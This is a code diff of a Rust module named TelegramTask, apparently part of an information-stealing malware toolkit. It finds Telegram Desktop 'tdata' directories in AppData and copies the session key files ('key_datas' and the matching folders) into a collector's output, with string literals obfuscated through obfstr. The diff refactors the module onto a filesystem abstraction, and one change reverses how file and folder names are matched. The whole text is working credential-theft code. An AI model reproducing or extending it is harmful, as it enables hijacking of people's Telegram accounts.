@@ -1,14 +1,17 @@
 use alloc::borrow::ToOwned;
-use alloc::vec;
+use alloc::fmt::format;
+use alloc::{format, vec};
 use collector::{Collector, Software};
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{copy_file, copy_folder, FileSystem, FileSystemExt};
 use obfstr::obfstr as s;
 use tasks::Task;
-use utils::path::Path;
 
 pub(super) struct TelegramTask;
 
-impl<C: Collector> Task<C> for TelegramTask {
-    fn run(&self, parent: &Path, collector: &C) {
+impl<C: Collector, F: FileSystem> Task<C, F> for TelegramTask {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let appdata = &Path::appdata();
         let paths = [
             (
@@ -22,19 +25,20 @@ impl<C: Collector> Task<C> for TelegramTask {
         ];
 
         for (client, tdata_path) in paths {
-            if tdata_path.is_exists() {
+            if StorageFileSystem.is_exists(&tdata_path) {
                 let dst = parent / client;
-                copy_tdata(&tdata_path, &dst, collector);
+                copy_tdata(&tdata_path, filesystem, &dst, collector);
             }
         }
     }
 }
 
-fn copy_tdata<C>(tdata: &Path, dst: &Path, collector: &C)
+fn copy_tdata<C, F>(tdata: &Path, dst_filesystem: &F, dst: &Path, collector: &C)
 where
     C: Collector,
+    F: FileSystem,
 {
-    if !(tdata / s!("key_datas")).is_exists() {
+    if !StorageFileSystem.is_exists(tdata / s!("key_datas")) {
         return;
     }
 
@@ -42,11 +46,11 @@ where
     let mut files = vec![];
     let mut dirs = vec![];
 
-    if let Some(list_files) = tdata.list_files() {
+    if let Some(list_files) = StorageFileSystem.list_files(tdata) {
         for path in list_files {
-            if path.is_file() {
+            if StorageFileSystem.is_file(&path) {
                 files.push(path);
-            } else if path.is_dir() {
+            } else if StorageFileSystem.is_dir(&path) {
                 dirs.push(path);
             }
         }
@@ -54,7 +58,10 @@ where
 
     for file in &files {
         for dir in &dirs {
-            if dir.name().unwrap().to_owned() + "s" == file.name().unwrap() {
+            if let Some(dir_name) = dir.name()
+                && let Some(file_name) = file.name()
+                && dir_name == format!("s{file_name}")
+            {
                 contents.push(file);
                 contents.push(dir);
             }
@@ -66,10 +73,11 @@ where
     }
 
     for path in contents {
-        if path.is_file() {
-            let _ = path.copy_file(dst, true);
-        } else if path.is_dir() {
-            let _ = path.copy_folder(dst);
+        if StorageFileSystem.is_file(path) {
+            let _ = copy_file(StorageFileSystem, path, dst_filesystem, dst, true);
+        } else if StorageFileSystem.is_dir(path) {
+            let _ = copy_folder(StorageFileSystem, path, dst_filesystem, dst);
         }
     }
+
 }
